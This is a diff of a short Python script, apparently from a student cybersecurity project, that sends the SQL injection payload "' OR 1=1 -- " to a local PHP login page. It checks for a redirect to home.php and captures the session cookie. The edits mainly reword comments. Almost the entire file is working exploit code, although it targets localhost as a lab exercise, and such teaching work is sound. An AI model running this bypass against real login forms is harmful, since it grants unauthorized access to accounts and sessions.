@@ -1,17 +1,12 @@
 import requests
-
-#-------- can delete these ----------------------
-# Target URL (change to wherever the site is running on your XAMPP)
 target_url = "http://localhost/CyberProject/login.php"
 
-# The payload we discovered that bypasses authentication.
-# Note: SQLite requires a trailing space after the -- comment token.
 payload_username = "' OR 1=1 -- "
 payload_password = "anything_works"
 #-----------------------------------------------
 
 def sql_login_bypass(target_url="http://localhost/CyberProject/login.php", payload_username="' OR 1=1 -- ", payload_password="anything_works"):        
-    # Form data (the field names must match the name= attributes in the HTML).
+    #the data structure is consistent with the HTML form fields
     data = {
         "username": payload_username,
         "password": payload_password,
@@ -21,10 +16,11 @@ def sql_login_bypass(target_url="http://localhost/CyberProject/login.php", paylo
     print(f"[*] Attempting SQL Injection on {target_url}...")
 
     try:
-        # Don't follow redirects automatically so we can see the 302.
+        # after getting 302 (new address) we want to catch the 302 and not move to home,
+        #so- allow_redirects=False
         response = requests.post(target_url, data=data, allow_redirects=False)
 
-        # On successful login, login.php sends header("Location: home.php") -> 302.
+        
         if response.status_code == 302 and "home.php" in response.headers.get("Location", ""):
             session_id = response.cookies.get("PHPSESSID")
             print("[+] SUCCESS: SQL Injection Bypass Worked!")
